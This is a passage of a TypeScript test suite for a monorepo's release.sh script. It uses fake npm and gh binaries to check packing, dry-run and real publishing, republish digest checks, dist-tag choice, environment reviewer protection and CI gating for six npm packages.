			`publish|${NAMES[d]}-${version}.tgz|--access public${tag === "latest" ? "" : ` --tag ${tag}`} --provenance --ignore-scripts --registry https://registry.npmjs.org/${dry ? " --dry-run" : ""}|cwd=0|userconfig=${dry ? "" : `//registry.npmjs.org/:_authToken=$${"{"}NODE_AUTH_TOKEN};`}|globalconfig=0|cache=fresh|from=assembled`,
	);

/** The registry's dist line for <d>@<version>: the digests of the tarball the fake npm was
 * last handed for it (a previous publish or dry run of the same commit). */
function distOf(version: string, d: string, bytes?: Buffer): string {
	const tgz = bytes ?? readFileSync(join(dir, `log.${NAMES[d]}-${version}.tgz`));
	const sha512 = createHash("sha512").update(tgz).digest("base64");
	const sha1 = createHash("sha1").update(tgz).digest("hex");
	return `${NAMES[d]}@${version} dist sha512-${sha512} ${sha1}`;
}

function run(args: string[], env: Record<string, string> = {}) {
	const r = spawnSync("bash", [join(repo, "scripts/release.sh"), ...args], {
		cwd: repo,
		encoding: "utf8",
		timeout: 20_000,
		env: {
			...gitEnv(),
			PATH: `${join(dir, "bin")}:${process.env.PATH}`,
			FAKE_REGISTRY: join(dir, "registry"),
			FAKE_RUNS: join(dir, "runs.json"),
			FAKE_JOBS: join(dir, "jobs.json"),
			FAKE_LOG: join(dir, "log"),
			FAKE_CALLS: join(dir, "calls"),
			FAKE_ARTIFACTS: join(dir, "tarballs"),
			FAKE_ENV: join(dir, "env.json"),
			GITHUB_REPOSITORY: "owner/repo",
			REQUIRED_CI_JOBS: publish.env?.REQUIRED_CI_JOBS ?? "",
			REPUBLISH: "false",
			...env,
		},
	});
	return { status: r.status, out: r.stdout, err: r.stderr };
}

function log(): string[] {
	try {
		return readFileSync(join(dir, "log"), "utf8").trim().split("\n").filter(Boolean);
	} catch {
		return [];
	}
}

/** A release commit the way the workflow makes one: only the six versions change. */
function releaseCommit(version: string): void {
	writePackages(version);
	git("add", ...DIRS.map((d) => `packages/${d}/package.json`));
	git("commit", "-q", "-m", `release: v${version}`);
	git("tag", "-a", `v${version}`, "-m", `v${version}`);
}

beforeEach(() => {
	dir = mkdtempSync(join(tmpdir(), "release-sh-"));
	repo = join(dir, "repo");
	mkdirSync(join(dir, "bin"), { recursive: true });
	for (const [name, body] of [
		["npm", FAKE_NPM],
		["gh", FAKE_GH],
	] as const) {
		writeFileSync(join(dir, "bin", name), body);
		chmodSync(join(dir, "bin", name), 0o755);
	}
	mkdirSync(join(repo, "scripts"), { recursive: true });
	writeFileSync(join(repo, "scripts/release.sh"), readFileSync(SCRIPT, "utf8"));
	writeFileSync(join(repo, "scripts/release-tarball.py"), readFileSync(TOOL, "utf8"));
	writePackages("1.0.0");
	writeFileSync(join(repo, "README"), "x\n");
	git("init", "-q", "-b", "master");
	git("add", ".");
	git("commit", "-q", "-m", "base");
	// The remote the script fetches master and tags from.
	gitIn(dir, "init", "-q", "--bare", "-b", "master", "origin.git");
	git("remote", "add", "origin", join(dir, "origin.git"));
	git("push", "-q", "origin", "master");
	setRegistry([]);
	setCi(allGreen());
	setEnvironment(protectedEnv());
});

afterEach(() => {
	rmSync(dir, { recursive: true, force: true });
});

describe("release.sh pack", { timeout: 30_000 }, () => {
	it("packs every package, running no lifecycle script", () => {
		const out = join(dir, "tarballs");
		const r = run(["pack", out]);
		expect(r.status).toBe(0);
		expect(log()).toEqual(
			DIRS.map((d) => `pack|${d}|pack --ignore-scripts --pack-destination ${out}`),
		);
		for (const d of DIRS) expect(r.out).toContain(`packed ${NAMES[d]}-1.0.0.tgz`);
	});
});

describe("release.sh publish", { timeout: 30_000 }, () => {
	it("dry run: the real publish command plus --dry-run, for every tarball, in order", () => {
		const out = packAll();
		const r = run(["publish", out, "HEAD", "--dry-run"]);
		expect(r.status).toBe(0);
		expect(log()).toEqual(published("1.0.0", DIRS, true));
	});

	it("real run: the same command without --dry-run", () => {
		const out = packAll();
		const r = run(["publish", out, "HEAD"]);
		expect(r.status).toBe(0);
		expect(log()).toEqual(published("1.0.0", DIRS, false));
	});

	it("a new release refuses a version already on npm, before publishing anything", () => {
		// Published since the build job's assert-unreleased (the approval can take hours). In
		// the workflow this is the dry-run step, before the push: nothing is pushed, published
		// or released.
		const out = packAll();
		setRegistry(["usertrust-openclaw@1.0.0 yes"]);
		rmSync(join(dir, "calls"), { force: true });
		for (const args of [
			["publish", out, "HEAD", "--dry-run"],
			["publish", out, "HEAD"],
		]) {
			const r = run(args);
			expect(r.status, args.join(" ")).not.toBe(0);
			expect(r.err).toContain("::error::Already on npm: usertrust-openclaw@1.0.0.");
		}
		expect(log()).toEqual([]);
		expect(readFileSync(join(dir, "calls"), "utf8")).not.toContain("publish");
	});

	it("refuses to run without a REPUBLISH of true or false", () => {
		const out = packAll();
		for (const value of ["", "yes", "TRUE"]) {
			const r = run(["publish", out, "HEAD", "--dry-run"], { REPUBLISH: value });
			expect(r.status, value).not.toBe(0);
			expect(r.err).toContain("not true or false");
		}
		expect(log()).toEqual([]);
	});

	it("a republish skips a version npm holds byte-identical to this run's tarball", () => {
		const out = packAll();
		expect(run(["publish", out, "HEAD", "--dry-run"], { REPUBLISH: "true" }).status).toBe(0);
		rmSync(join(dir, "log"));
		setRegistry([
			"usertrust@1.0.0 yes",
			"usertrust-verify@1.0.0 yes",
			distOf("1.0.0", "core"),
			distOf("1.0.0", "verify"),
		]);
		const r = run(["publish", out, "HEAD"], { REPUBLISH: "true" });
		expect(r.status, r.err).toBe(0);
		expect(r.out).toContain(
			"::notice::usertrust@1.0.0 is already on npm, byte-identical to this run's tarball; skipping",
		);
		expect(r.out).toContain("::notice::usertrust-verify@1.0.0 is already on npm, byte-identical");
		expect(log()).toEqual(published("1.0.0", DIRS.slice(2), false));
	});

	it("a republish refuses a version npm holds with other bytes, before publishing anything", () => {
		const out = packAll();
		expect(run(["publish", out, "HEAD", "--dry-run"], { REPUBLISH: "true" }).status).toBe(0);
		const ours = distOf("1.0.0", "verify").split(" ");
		const other = distOf("1.0.0", "verify", Buffer.from("not this run's tarball")).split(" ");
		for (const [integrity, shasum] of [
			[other[2], other[3]],
			[other[2], ours[3]],
			[ours[2], other[3]],
		]) {
			rmSync(join(dir, "log"), { force: true });
			setRegistry([
				"usertrust@1.0.0 yes",
				"usertrust-verify@1.0.0 yes",
				distOf("1.0.0", "core"),
				`usertrust-verify@1.0.0 dist ${integrity} ${shasum}`,
			]);
			const r = run(["publish", out, "HEAD"], { REPUBLISH: "true" });
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("usertrust-verify@1.0.0 is on npm, but not as the tarball this run");
			expect(log()).toEqual([]);
		}
	});

	it("a republish refuses when npm's digest for a version it holds cannot be read", () => {
		const out = packAll();
		for (const dist of [
			"",
			"usertrust-verify@1.0.0 dist error",
			"usertrust-verify@1.0.0 dist raw:not-json",
			"usertrust-verify@1.0.0 dist raw:{}",
			"usertrust-verify@1.0.0 dist sha1-abc= 0123456789abcdef0123456789abcdef01234567",
			"usertrust-verify@1.0.0 dist sha512-QUJD none",
		]) {
			setRegistry(["usertrust-verify@1.0.0 yes", dist]);
			const r = run(["publish", out, "HEAD"], { REPUBLISH: "true" });
			expect(r.status, dist).not.toBe(0);
			expect(r.err).toContain("usertrust-verify@1.0.0");
			expect(log()).toEqual([]);
		}
	});

	it("an unreadable registry stops it before publishing anything, never reads as 'not published'", () => {
		const out = packAll();
		setRegistry(["usertrust-openclaw@1.0.0 error"]);
		const r = run(["publish", out, "HEAD"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("usertrust-openclaw@1.0.0");
		expect(log()).toEqual([]);
	});

	it("publishes nothing if any tarball is missing", () => {
		const out = packAll();
		rmSync(join(out, "usertrust-ui-1.0.0.tgz"));
		const r = run(["publish", out, "HEAD"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("usertrust-ui-1.0.0.tgz is missing");
		expect(log()).toEqual([]);
	});

	it("publishes nothing if any build tarball is refused", () => {
		const out = packAll();
		writeFileSync(
			join(out, "usertrust-server-1.0.0.tgz"),
			gz(archive(member("package/package.json", "{}"), member("package/dist/.npmrc", "x"))),
		);
		const r = run(["publish", out, "HEAD"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("begins or ends with a dot");
		expect(r.err).toContain("usertrust-server-1.0.0.tgz from the build was refused");
		expect(log()).toEqual([]);
	});

	it("npm is called only to look up versions and to publish, never to pack or install", () => {
		const out = packAll();
		rmSync(join(dir, "calls"), { force: true });
		expect(run(["publish", out, "HEAD"]).status).toBe(0);
		const calls = new Set(readFileSync(join(dir, "calls"), "utf8").trim().split("\n"));
		expect([...calls].sort()).toEqual(["publish", "view"]);
	});

	it("each publish gets its own fresh, private npm cache", () => {
		const out = packAll();
		expect(run(["publish", out, "HEAD"]).status).toBe(0);
		const caches = readFileSync(join(dir, "log.caches"), "utf8").trim().split("\n");
		expect(caches.length).toBe(6);
		expect(new Set(caches).size).toBe(6);
		for (const c of caches) expect(c.startsWith(join(dir, "tarballs"))).toBe(false);
	});

	it("refuses a root file the commit records as a symlink", () => {
		symlinkSync("../../README", join(repo, "packages/core/LICENSE"));
		git("add", "-A");
		git("commit", "-q", "-m", "linked LICENSE");
		const out = packAll();
		const r = run(["publish", out, "HEAD", "--dry-run"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain(
			"packages/core/LICENSE in HEAD is not a regular file (tree entry: '120000",
		);
		expect(log()).toEqual([]);
	});

	it("refuses a root file the manifest lists but the commit lacks", () => {
		writePackages("1.0.0", { files: ["dist", "NOTICE"] });
		git("commit", "-q", "-am", "lists NOTICE");
		const out = packAll();
		const r = run(["publish", out, "HEAD", "--dry-run"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain(
			"packages/core/NOTICE in HEAD is not a regular file (tree entry: none)",
		);
		expect(log()).toEqual([]);
	});

	it("needs a files list in each manifest, of dist and plain root files only", () => {
		for (const [files, message] of [
			[undefined, 'has no "files" list'],
			[["dist", "src/x.js"], '"files" entry "src/x.js" is neither dist'],
			[["dist", ".npmrc"], '"files" entry ".npmrc" is neither dist'],
			[["dist", "*.json"], '"files" entry "*.json" is neither dist'],
		] as const) {
			writePackages("1.0.0", { files });
			git("commit", "-q", "-am", "files");
			const out = packAll();
			const r = run(["publish", out, "HEAD", "--dry-run"]);
			expect(r.status, JSON.stringify(files)).not.toBe(0);
			expect(r.err).toContain(message);
			expect(log()).toEqual([]);
		}
	});

	it("refuses packages that disagree on the version", () => {
		const out = packAll();
		writeFileSync(
			join(repo, "packages/ui/package.json"),
			JSON.stringify({ name: "usertrust-ui", version: "1.0.1" }),
		);
		git("commit", "-q", "-am", "ui drifts");
		const r = run(["publish", out, "HEAD", "--dry-run"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("packages/ui is at 1.0.1");
		expect(log()).toEqual([]);
	});

	it("rejects an unknown flag, and a missing directory", () => {
		const out = packAll();
		expect(run(["publish", out, "HEAD", "--force"]).status).not.toBe(0);
		expect(run(["publish", out]).status).not.toBe(0);
		expect(run(["publish", "--dry-run"]).status).not.toBe(0);
		expect(run(["publish"]).status).not.toBe(0);
		expect(log()).toEqual([]);
	});
});

describe("release.sh publish: the npm dist-tag", { timeout: 30_000 }, () => {
	it("the newest release publishes all six under latest, dry run and real", () => {
		gitIn(join(dir, "origin.git"), "tag", "v0.9.0", "master");
		git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
		expect(run(["dist-tag", "1.0.0"]).out.trim()).toBe("latest");
		const out = packAll();
		const dry = run(["publish", out, "HEAD", "--dry-run"]);
		expect(dry.status, dry.err).toBe(0);
		expect(log()).toEqual(published("1.0.0", DIRS, true, "latest"));
		rmSync(join(dir, "log"));
		const real = run(["publish", out, "HEAD"]);
		expect(real.status, real.err).toBe(0);
		expect(log()).toEqual(published("1.0.0", DIRS, false, "latest"));
		expect(log().join("\n")).not.toContain("--tag");
	});

	it("latest is npm's default, never an explicit --tag, whatever npm_config_tag says", () => {
		git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
		const out = packAll();
		const r = run(["publish", out, "HEAD"], { npm_config_tag: "next", NPM_CONFIG_TAG: "next" });
		expect(r.status, r.err).toBe(0);
		expect(log()).toEqual(published("1.0.0", DIRS, false, "latest"));
		expect(readFileSync(join(dir, "log.tagenv"), "utf8")).toBe("");
	});

	it("a republish of an older version publishes under backfill, and is not the GitHub Latest", () => {
		git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
		gitIn(join(dir, "origin.git"), "tag", "v1.1.0", "master");
		const out = packAll();
		const dry = run(["publish", out, "HEAD", "--dry-run"], { REPUBLISH: "true" });
		expect(dry.status, dry.err).toBe(0);
		expect(log()).toEqual(published("1.0.0", DIRS, true, "backfill"));
		rmSync(join(dir, "log"));
		const real = run(["publish", out, "HEAD"], { REPUBLISH: "true" });
		expect(real.status, real.err).toBe(0);
		expect(log()).toEqual(published("1.0.0", DIRS, false, "backfill"));
		// The GitHub Release reads the same function, and gets the same answer.
		expect(run(["latest-flag", "1.0.0"]).out.trim()).toBe("false");
		expect(run(["dist-tag", "1.0.0"]).out.trim()).toBe("backfill");
	});

	it("refuses before any npm call when latest-flag cannot tell, never defaulting to latest", () => {
		const out = packAll();
		rmSync(join(dir, "calls"), { force: true });
		git("remote", "set-url", "origin", join(dir, "nowhere.git"));
		for (const args of [
			["publish", out, "HEAD", "--dry-run"],
			["publish", out, "HEAD"],
		]) {
			const r = run(args);
			expect(r.status, args.join(" ")).not.toBe(0);
			expect(r.err).toContain("Could not fetch tags");
			expect(r.err).toContain("::error::Could not tell whether v1.0.0 is the newest release");
		}
		expect(log()).toEqual([]);
		expect(existsSync(join(dir, "calls"))).toBe(false);
		const t = run(["dist-tag", "1.0.0"]);
		expect(t.status).not.toBe(0);
		expect(t.out).toBe("");
	});

	// npm's versions count as well as the tags (npm's own rule: the highest version it holds,
	// prereleases skipped), for all six before any is published: a version published without a
	// v* tag, whose tag was lost, or under another dist-tag would otherwise lose latest to an
	// older release (an explicit --tag latest bypasses npm's check; its absence alone would
	// stop the release only part-way, at that package).
	const onNpm = (versions: string, except: Record<string, string> = {}) =>
		DIRS.map((d) => {
			const name = NAMES[d] as string;
			return `${name} versions ${except[name] ?? versions}`;
		});

	it("npm holding a higher version with no v* tag makes it backfill, for npm and GitHub alike", () => {
		git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
		releaseCommit("1.1.0");
		const out = packAll();
		// Control: with npm at 1.0.0 everywhere, 1.1.0 is the newest release.
		setRegistry(onNpm("0.9.0,1.0.0"));
		expect(run(["latest-flag", "1.1.0"]).out.trim()).toBe("true");
		for (const server of ["0.9.0,1.0.0,1.2.0", "one:1.2.0"]) {
			setRegistry(onNpm("0.9.0,1.0.0", { "usertrust-server": server }));
			const flag = run(["latest-flag", "1.1.0"]);
			expect(flag.status, flag.err).toBe(0);
			expect(flag.out.trim(), server).toBe("false");
			expect(run(["dist-tag", "1.1.0"]).out.trim()).toBe("backfill");
		}
		const dry = run(["publish", out, "HEAD", "--dry-run"]);
		expect(dry.status, dry.err).toBe(0);
		expect(log()).toEqual(published("1.1.0", DIRS, true, "backfill"));
	});

	it("a higher prerelease on npm does not hold latest (npm's own check skips prereleases)", () => {
		git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
		setRegistry(onNpm("0.9.0,1.0.0", { "usertrust-ui": "1.0.0,2.0.0-rc.1" }));
		expect(run(["latest-flag", "1.0.1"]).out.trim()).toBe("true");
	});

	it("a partial republish, some packages already at the version and none higher, stays latest", () => {
		git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
		releaseCommit("1.1.0");
		const out = packAll();
		setRegistry(onNpm("1.0.0"));
		expect(run(["publish", out, "HEAD", "--dry-run"], { REPUBLISH: "true" }).status).toBe(0);
		rmSync(join(dir, "log"));
		setRegistry([
			"usertrust@1.0.0 yes",
			"usertrust@1.1.0 yes",
			"usertrust-verify@1.1.0 yes",
			distOf("1.1.0", "core"),
			distOf("1.1.0", "verify"),
			...onNpm("1.0.0").slice(2),
		]);
		expect(run(["latest-flag", "1.1.0"]).out.trim()).toBe("true");
		const r = run(["publish", out, "HEAD"], { REPUBLISH: "true" });
		expect(r.status, r.err).toBe(0);
		expect(log()).toEqual(published("1.1.0", DIRS.slice(2), false, "latest"));
	});

	it("a package npm has never published (its registry 404) holds nothing; npm is asked about all six", () => {
		git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
		setRegistry(onNpm("1.0.0").filter((l) => !l.startsWith("usertrust-ui ")));
		const r = run(["latest-flag", "1.0.0"]);
		expect(r.status, r.err).toBe(0);
		expect(r.out.trim()).toBe("true");
		expect(readFileSync(join(dir, "log.views"), "utf8").trim().split("\n")).toEqual(
			DIRS.map(
				(d) =>
					`view ${NAMES[d]} versions --json --tag latest --registry https://registry.npmjs.org/`,
			),
		);
	});

	it("an unreadable registry refuses before any npm publish, never defaulting to latest", () => {
		git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
		const out = packAll();
		setRegistry(onNpm("1.0.0", { "usertrust-openclaw": "error" }));
		rmSync(join(dir, "calls"), { force: true });
		for (const args of [
			["publish", out, "HEAD", "--dry-run"],
			["publish", out, "HEAD"],
		]) {
			const r = run(args);
			expect(r.status, args.join(" ")).not.toBe(0);
			expect(r.err).toContain("Could not read the versions of usertrust-openclaw on npm");
			expect(r.err).toContain("::error::Could not tell whether v1.0.0 is the newest release");
		}
		expect(log()).toEqual([]);
		expect(readFileSync(join(dir, "calls"), "utf8")).not.toContain("publish");
		for (const args of [
			["latest-flag", "1.0.0"],
			["dist-tag", "1.0.0"],
		]) {
			const r = run(args);
			expect(r.status, args.join(" ")).not.toBe(0);
			expect(r.out).toBe("");
		}
	});

	for (const [bad, message] of [
		["raw:not-json", "not a list of versions"],
		["raw:{}", "not a list of versions"],
		["raw:[1]", "not a list of versions"],
		["empty", "not a list of versions"],
		["1.0.0,banana", 'Not a semver version: "banana"'],
		["1.0.0,1.0", 'Not a semver version: "1.0"'],
	] as const) {
		it(`an answer of ${JSON.stringify(bad)} cannot be compared, and refuses`, () => {
			git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
			setRegistry(onNpm("1.0.0", { "usertrust-verify": bad }));
			const r = run(["latest-flag", "1.0.0"]);
			expect(r.status).not.toBe(0);
			expect(r.out).toBe("");
			expect(r.err).toContain(message);
		});
	}

	for (const env of [{ npm_config_tag: "next" }, { NPM_CONFIG_TAG: "next" }]) {
		it(`${Object.keys(env)[0]}=next in the environment does not hide a higher version on npm`, () => {
			// npm resolves a bare name against the tag config (lib/commands/view.js): a tag the
			// package lacks matches no version, and npm answers E404 "No match found". The tag is
			// dropped before npm runs, view asks for latest explicitly, and that E404 never reads
			// as "never published".
			git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
			releaseCommit("1.1.0");
			const out = packAll();
			setRegistry(onNpm("1.0.0", { "usertrust-server": "1.0.0,1.2.0" }));
			const flag = run(["latest-flag", "1.1.0"], env);
			expect(flag.status, flag.err).toBe(0);
			expect(flag.out.trim()).toBe("false");
			expect(run(["dist-tag", "1.1.0"], env).out.trim()).toBe("backfill");
			const dry = run(["publish", out, "HEAD", "--dry-run"], env);
			expect(dry.status, dry.err).toBe(0);
			expect(log()).toEqual(published("1.1.0", DIRS, true, "backfill"));
			expect(readFileSync(join(dir, "log.tagenv"), "utf8")).toBe("");
		});
	}

	for (const [answer, message] of [
		["nomatch:next", "E404: No match found for version next"],
		["e404-other", "E404: Not Found - GET https://registry.npmjs.org/some-other-package"],
		["unpublished", "usertrust-verify was unpublished from npm (Unpublished on 2026-01-01"],
	] as const) {
		it(`an npm view E404 other than the package's own 404 (${answer}) refuses before any publish`, () => {
			git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
			const out = packAll();
			setRegistry(onNpm("1.0.0", { "usertrust-verify": answer }));
			rmSync(join(dir, "calls"), { force: true });
			for (const args of [
				["publish", out, "HEAD", "--dry-run"],
				["publish", out, "HEAD"],
				["latest-flag", "1.0.0"],
			]) {
				const r = run(args);
				expect(r.status, args.join(" ")).not.toBe(0);
				expect(r.out.trim()).not.toMatch(/^(true|false)$/);
				expect(r.err).toContain(message);
			}
			expect(log()).toEqual([]);
			expect(readFileSync(join(dir, "calls"), "utf8")).not.toContain("publish");
		});
	}

	it("npm's own refusal mid-release (the pre-check passed) fails the run before any release", () => {
		// npm's check finds a version the pre-check's npm view did not show (one published
		// since). The dry run passed before it appeared; the real publish stops at that package,
		// non-zero, and nothing here creates or marks a GitHub Release (gh is never called; the
		// workflow's release step runs only after this one succeeded: see publish.yml above).
		git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
		releaseCommit("1.1.0");
		const out = packAll();
		setRegistry(onNpm("1.0.0"));
		const dry = run(["publish", out, "HEAD", "--dry-run"]);
		expect(dry.status, dry.err).toBe(0);
		rmSync(join(dir, "log"));
		setRegistry([...onNpm("1.0.0"), "usertrust-server refuses-latest 2.0.0"]);
		const r = run(["publish", out, "HEAD"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain('Cannot implicitly apply the "latest" tag');
		expect(r.out).toContain("Publishing usertrust-server@1.1.0 under latest");
		expect(log()).toEqual(published("1.1.0", DIRS.slice(0, 3), false, "latest"));
		expect(log().some((l) => l.startsWith("gh|"))).toBe(false);
		// The same refusal under --dry-run (npm 11 checks before its dry-run short-circuit).
		rmSync(join(dir, "log"));
		expect(run(["publish", out, "HEAD", "--dry-run"]).status).not.toBe(0);
		expect(log()).toEqual(published("1.1.0", DIRS.slice(0, 3), true, "latest"));
	});
});

describe("release.sh assert-npm", { timeout: 30_000 }, () => {
	it("prints node's and npm's versions, and passes on npm 11 or later", () => {
		for (const v of ["11.0.0", "11.19.0", "12.2.0"]) {
			const r = run(["assert-npm"], { FAKE_NPM_VERSION: v });
			expect(r.status, `${v}: ${r.err}`).toBe(0);
			expect(r.out).toContain(`node ${process.version}, npm ${v}`);
		}
	});

	for (const v of ["10.9.9", "9.9.4", "", "eleven"]) {
		it(`refuses npm ${JSON.stringify(v)}`, () => {
			const r = run(["assert-npm"], { FAKE_NPM_VERSION: v });
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("Refusing to release");
		});
	}
});

describe("release.sh assert-protected", { timeout: 30_000 }, () => {
	it("passes when the environment requires one reviewer, and asks about that environment", () => {
		const r = run(["assert-protected", "npm-publish"]);
		expect(r.status).toBe(0);
		expect(r.out).toContain("requires 1 reviewer(s)");
		expect(log()).toEqual(["gh|repos/owner/repo/environments/npm-publish"]);
	});

	it("passes with a warning when there is no deployment-branch policy", () => {
		setEnvironment(protectedEnv([reviewersRule(2)], null));
		const r = run(["assert-protected", "npm-publish"]);
		expect(r.status).toBe(0);
		expect(r.out).toContain("no deployment-branch policy");
	});

	const refusals: [string, () => void, string][] = [
		["a 404 (no such environment)", () => {}, "does not exist"],
		["a 403 (permission)", () => {}, "actions: read"],
		["another HTTP error", () => {}, "Could not read environment"],
		["no protection rules", () => setEnvironment(protectedEnv([])), "requires no reviewer"],
		[
			"a required_reviewers rule with 0 reviewers",
			() => setEnvironment(protectedEnv([reviewersRule(0)])),
			"requires no reviewer",
		],
		[
			"only a wait timer",
			() => setEnvironment(protectedEnv([{ id: 3, type: "wait_timer", wait_timer: 30 }])),
			"requires no reviewer",
		],
		[
			"protection_rules missing",
			() => setEnvironment({ id: 1, name: "npm-publish" }),
			"requires no reviewer",
		],
		["an unparseable answer", () => setEnvironment("<html>oops</html>"), "not an environment"],
		["an empty answer", () => setEnvironment(""), "not an environment"],
		[
			"two JSON documents in one answer",
			() => setEnvironment(JSON.stringify(protectedEnv()).repeat(2)),
			"not an environment",
		],
		[
			"another environment's answer",
			() => setEnvironment({ ...protectedEnv(), name: "staging" }),
			"not an environment",
		],
	];
	const http: Record<string, string> = {
		"a 404 (no such environment)": "404",
		"a 403 (permission)": "403",
		"another HTTP error": "502",
	};
	for (const [what, arrange, message] of refusals) {
		it(`refuses on ${what}`, () => {
			arrange();
			const r = run(
				["assert-protected", "npm-publish"],
				http[what] ? { FAKE_ENV_HTTP: http[what] } : {},
			);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain(message);
			expect(r.err).toContain("Refusing to release");
		});
	}

	it("the 404 refusal names the owner step", () => {
		const r = run(["assert-protected", "npm-publish"], { FAKE_ENV_HTTP: "404" });
		expect(r.err).toContain("Owner step: create 'npm-publish'");
	});

	it("refuses without an environment name", () => {
		expect(run(["assert-protected"]).status).not.toBe(0);
		expect(log()).toEqual([]);
	});
});

describe("release.sh assert-unreleased / assert-published", { timeout: 30_000 }, () => {
	it("a new version with no tag and nothing on npm passes", () => {
		expect(run(["assert-unreleased"]).status).toBe(0);
	});

	it("an existing tag fails", () => {
		git("tag", "-a", "v1.0.0", "-m", "v1.0.0");
		const r = run(["assert-unreleased"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("Tag v1.0.0 already exists");
	});

	it("a version already on npm fails and is named", () => {
		setRegistry(["usertrust-server@1.0.0 yes"]);
		const r = run(["assert-unreleased"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("usertrust-server@1.0.0 is already on npm");
	});

	it("assert-published names what is missing and points at republish", () => {
		setRegistry(DIRS.filter((d) => d !== "ui").map((d) => `${NAMES[d]}@1.0.0 yes`));
		const r = run(["assert-published"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("usertrust-ui@1.0.0");
		expect(r.err).toContain("republish on the tag v1.0.0");
	});

	it("assert-published passes when all six are on npm", () => {
		setRegistry(DIRS.map((d) => `${NAMES[d]}@1.0.0 yes`));
		expect(run(["assert-published"]).status).toBe(0);
	});
});

describe("release.sh gate (normal release)", { timeout: 30_000 }, () => {
	it("passes when every required job succeeded, and asks about this exact commit", () => {
		const r = run(["gate"]);
		expect(r.status).toBe(0);
		const head = git("rev-parse", "HEAD");
		expect(log()[0]).toBe(
			`gh|repos/owner/repo/actions/workflows/ci.yml/runs?head_sha=${head}&event=push&per_page=100`,
		);
	});

	const cases: [string, ReturnType<typeof job>[], string][] = [
		["missing", allGreen().filter((j) => j.name !== "lint"), "'lint' on"],
		[
			"pending",
			allGreen().map((j) => (j.name === "test" ? job("test", null, "in_progress") : j)),
			"'test' on",
		],
		[
			"skipped",
			allGreen().map((j) => (j.name === "site-build" ? job("site-build", "skipped") : j)),
			"'site-build' on",
		],
		[
			"failed",
			allGreen().map((j) => (j.name === "typecheck" ? job("typecheck", "failure") : j)),
			"'typecheck' on",
		],
		[
			"cancelled",
			allGreen().map((j) => (j.name === "tb-integration" ? job("tb-integration", "cancelled") : j)),
			"'tb-integration' on",
		],
	];
	for (const [what, jobs, named] of cases) {
		it(`fails on a ${what} required check, and names it`, () => {
			setCi(jobs);
			const r = run(["gate"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain(named);
		});
	}

	it("fails when CI never ran on the commit", () => {
		setCi(null);
		const r = run(["gate"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("has no run for a push of");
	});

	it("fails while the CI run is still in progress", () => {
		setCi(allGreen(), { status: "in_progress", conclusion: null });
		const r = run(["gate"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("is in_progress");
	});

	it("fails on a failed job the list does not name", () => {
		setCi([...allGreen(), job("new-job", "failure")]);
		const r = run(["gate"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("'new-job'");
	});

	it("fails when the workflow pins no checks", () => {
		const r = run(["gate"], { REQUIRED_CI_JOBS: "  " });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("REQUIRED_CI_JOBS is empty");
	});
});

describe("release.sh gate (republish)", { timeout: 30_000 }, () => {
	it("release-parent prints the parent of a version-only release commit", () => {
		const parent = git("rev-parse", "HEAD");
		releaseCommit("1.0.1");
		const r = run(["release-parent"]);
		expect(r.status).toBe(0);
		expect(r.out.trim()).toBe(parent);
	});

	it("gates on the parent of a version-only release commit that is on master", () => {
		const parent = git("rev-parse", "HEAD");
		releaseCommit("1.0.1");
		git("push", "-q", "origin", "master");
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).toBe(0);
		expect(r.out).toContain("is on master");
		expect(log()[0]).toContain(`head_sha=${parent}&`);
	});

	it("refuses a version-only release commit tagged on a side branch, never on master", () => {
		git("switch", "-q", "-c", "side");
		releaseCommit("1.0.1");
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("is not on master");
		expect(r.err).toContain("side branch");
		expect(log()).toEqual([]);
	});

	it("checks master as it is now, not a stale local origin/master", () => {
		releaseCommit("1.0.1");
		git("push", "-q", "origin", "master");
		// The remote's master is rewound past the release; the local ref still has it.
		const base = git("rev-parse", "HEAD^");
		gitIn(join(dir, "origin.git"), "update-ref", "refs/heads/master", base);
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("is not on master");
	});

	it("refuses when origin has no master to check against", () => {
		releaseCommit("1.0.1");
		gitIn(dir, "init", "-q", "--bare", "-b", "trunk", "empty.git");
		git("remote", "set-url", "origin", join(dir, "empty.git"));
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("Could not fetch master");
		expect(log()).toEqual([]);
	});

	it("refuses in a shallow checkout, which cannot show ancestry", () => {
		releaseCommit("1.0.1");
		git("push", "-q", "origin", "master", "--follow-tags");
		const shallow = join(dir, "shallow");
		gitIn(
			dir,
			"clone",
			"-q",
			"--depth",
			"2",
			"--branch",
			"v1.0.1",
			`file://${join(dir, "origin.git")}`,
			shallow,
		);
		repo = shallow;
		mkdirSync(join(repo, "scripts"), { recursive: true });
		writeFileSync(join(repo, "scripts/release.sh"), readFileSync(SCRIPT, "utf8"));
